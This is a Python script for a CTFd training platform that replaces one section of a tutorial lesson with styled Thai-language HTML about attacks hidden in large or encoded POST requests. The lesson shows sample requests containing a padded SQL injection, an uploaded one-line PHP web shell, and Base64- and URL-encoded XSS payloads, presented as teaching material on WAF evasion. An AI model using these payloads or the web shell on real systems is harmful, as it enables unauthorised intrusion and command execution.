import json
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()

new_post_requests_html = """### 📦 การโจมตีผ่านคำขอขนาดใหญ่และการเข้ารหัสพฤติกรรมหลบเลี่ยง (Large & Encoded POST Requests)

โดยธรรมชาติแล้ว ข้อความ **GET Request** จะมีข้อจำกัดด้านความยาวพาธ (URL limit) อยู่ที่ประมาณ **2KB (2048 bytes)** เท่านั้น หากเกินกว่านี้เบราว์เซอร์หรือโปรแกรมตรวจรับจะไม่ส่งข้อมูลต่อ แต่ข้อความ **POST Request** ได้รับการออกแบบให้ส่งข้อมูลผ่านเนื้อหาหลัก (Body) ซึ่งแทบ **ไม่มีขีดจำกัดขนาดข้อมูล** ทำให้ผู้โจมตีมักเลือกใช้ช่องทาง POST เพื่อส่งไฟล์มุ่งร้าย แทรกโค้ดขนาดใหญ่ หรือเข้ารหัสไฟล์เพื่อหลีกเลี่ยงเครื่องมือรักษาความปลอดภัย (WAF)

#### ขีดจำกัดเริ่มต้นของขนาดรับส่งไฟล์ประเภท HTTP POST (POST body limits):
- **Nginx**: ขนาดจำกัดเริ่มต้น (Default) คือ **1MB** (สามารถแก้ไขคอนฟิกปรับเปลี่ยนได้ตามเหมาะสม)
- **Apache**: ขีดจำกัดการรับส่งไฟล์สูงสุดอยู่ที่ **2GB**
- **IIS (Windows)**: ขนาดเริ่มต้นอยู่ที่ **28.6MB** (และจำกัดพารามิเตอร์ URL ในคิวรีไม่เกิน 2048 bytes)

#### รูปแบบการโจมตีและการเข้ารหัสข้อมูลใน POST Request ที่พบบ่อย:

1. **ส่งสคริปต์อันตรายขนาดใหญ่เพื่อเจาะ SQL Injection (Large SQLi Payload)**:
   - นักโจมตีจะระบุข้อมูลอักขระขยะจำนวนหลายพันตัวแปรเพื่อปั่นป่วนระบบตรวจวิเคราะห์ และปิดท้ายด้วยคำสั่งแทรกฐานข้อมูล
   <div style="background:#070913;border:1px solid rgba(239,68,68,0.2);border-radius:8px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:0.75rem;line-height:1.45;color:#cbd5e1;text-align:left;margin:12px 0;box-shadow:0 4px 12px rgba(0,0,0,0.35);">
   <div style="color:#ef4444;font-weight:bold;margin-bottom:8px;border-bottom:1px solid rgba(239,68,68,0.08);padding-bottom:4px;font-size:0.7rem;text-transform:uppercase;">HTTP Request (Large SQLi Payload)</div>
   <span style="color:#00f0ff;font-weight:bold;">POST</span> /search HTTP/1.1<br>
   Host: example.com<br>
   Content-Type: application/x-www-form-urlencoded<br>
   Content-Length: 5000<br>
   <br>
   search=aaaaaaaaaaaaaaaaaaaa...(5000 characters)...<span style="color:#ef4444;font-weight:bold;">' OR 1=1 --</span>
   </div>

2. **การอัปโหลดไฟล์ไม่พึงประสงค์ (Web Shell Upload Exploitation)**:
   - การซ่อนโค้ดสั่งรันคำสั่ง OS (Web Shell เช่น `.php`) ผ่านคำขอประเภทอัปโหลดไฟล์ขนาดใหญ่แบบ `multipart/form-data`
   <div style="background:#070913;border:1px solid rgba(16,185,129,0.2);border-radius:8px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:0.75rem;line-height:1.45;color:#cbd5e1;text-align:left;margin:12px 0;box-shadow:0 4px 12px rgba(0,0,0,0.35);">
   <div style="color:#10b981;font-weight:bold;margin-bottom:8px;border-bottom:1px solid rgba(16,185,129,0.08);padding-bottom:4px;font-size:0.7rem;text-transform:uppercase;">HTTP Request (Web Shell Upload)</div>
   <span style="color:#00f0ff;font-weight:bold;">POST</span> /upload HTTP/1.1<br>
   Host: example.com<br>
   Content-Type: multipart/form-data; boundary=----XYZ<br>
   Content-Length: 15000<br>
   <br>
   <span style="color:#64748b;">------XYZ</span><br>
   Content-Disposition: form-data; name="file"; filename="<span style="color:#fbbf24;">shell.php</span>"<br>
   Content-Type: application/x-php<br>
   <br>
   <span style="color:#3ddc84;font-weight:bold;">&lt;?php system($_GET['cmd']); ?&gt;</span><br>
   <span style="color:#64748b;">------XYZ-</span>
   </div>

3. **การเข้ารหัสอำพรางโค้ดสคริปต์ (Base64 Encoded Payloads)**:
   - แปลงโค้ดมุ่งร้ายหลักให้เป็นอักขระตาราง Base64 เพื่อให้เครื่องมือ WAF ที่ดักสืบคำดักจับไม่เข้าใจความหมาย
   <div style="background:#070913;border:1px solid rgba(234,179,8,0.2);border-radius:8px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:0.75rem;line-height:1.45;color:#cbd5e1;text-align:left;margin:12px 0;box-shadow:0 4px 12px rgba(0,0,0,0.35);">
   <div style="color:#eab308;font-weight:bold;margin-bottom:8px;border-bottom:1px solid rgba(234,179,8,0.08);padding-bottom:4px;font-size:0.7rem;text-transform:uppercase;">HTTP Request (Base64 Encoded Payloads)</div>
   <span style="color:#00f0ff;font-weight:bold;">POST</span> /api HTTP/1.1<br>
   Host: example.com<br>
   Content-Type: application/x-www-form-urlencoded<br>
   Content-Length: 300<br>
   <br>
   data=<span style="color:#fbbf24;word-break:break-all;">PHNjcmlwdD5hbGVydCgnWHNTJyk8L3NjcmlwdD4=</span> <span style="color:#64748b;font-size:0.68rem;">&lt;-- [ถอดรหัส: &lt;script&gt;alert('XSS')&lt;/script&gt;]</span>
   </div>

4. **การเข้ารหัสพาธ URL และเลขฐานสิบหก (URL & Hex Encoding)**:
   - เข้ารหัสด้วยรูปแบบ `%` (เช่น `%3Cscript%3E` ➡️ `<script>`) หรือรูปแบบ Hex String (เช่น `3C73637269...`) เพื่อหลบเลี่ยงการตรวจสอบของฟิลเตอร์กรองอักขระพิเศษ
   <div style="background:#070913;border:1px solid rgba(168,85,247,0.2);border-radius:8px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:0.75rem;line-height:1.45;color:#cbd5e1;text-align:left;margin:12px 0;box-shadow:0 4px 12px rgba(0,0,0,0.35);">
   <div style="color:#a855f7;font-weight:bold;margin-bottom:8px;border-bottom:1px solid rgba(168,85,247,0.08);padding-bottom:4px;font-size:0.7rem;text-transform:uppercase;">HTTP Request (URL & Hex Obfuscation)</div>
   <span style="color:#00f0ff;font-weight:bold;">POST</span> /api HTTP/1.1<br>
   Host: example.com<br>
   Content-Length: 100<br>
   <br>
   data=<span style="color:#fbbf24;word-break:break-all;">%3Cscript%3Ealert%281%29%3C%2Fscript%3E</span> <span style="color:#64748b;font-size:0.68rem;">&lt;-- [ถอดรหัส: URL Encoded XSS]</span>
   </div>"""

with app.app_context():
    l = app.db.session.query(TutorialLesson).filter_by(id=177).first()
    if l:
        try:
            blocks = json.loads(l.content)
            val = blocks[0]["value"]
            
            start_marker = "### 📦 การโจมตีผ่านคำขอขนาดใหญ่และการเข้ารหัสพฤติกรรมหลบเลี่ยง (Large & Encoded POST Requests)"
            end_marker = "### 🛠️ เครื่องมือแกะรหัสหน้าเว็บ (Web Page Source Inspections)"
            
            start_idx = val.find(start_marker)
            end_idx = val.find(end_marker)
            
            if start_idx != -1 and end_idx != -1:
                # Overwrite the old markdown text with the new styled HTML blocks
                new_val = val[:start_idx] + new_post_requests_html + "\n\n" + val[end_idx:]
                blocks[0]["value"] = new_val
                l.content = json.dumps(blocks, ensure_ascii=False)
                app.db.session.commit()
                print("Successfully updated Large/Encoded POST Requests section with beautiful HTML panels!")
            else:
                print(f"Error: Markers not found. Start: {start_idx}, End: {end_idx}")
        except Exception as e:
            print(f"Error: {e}")
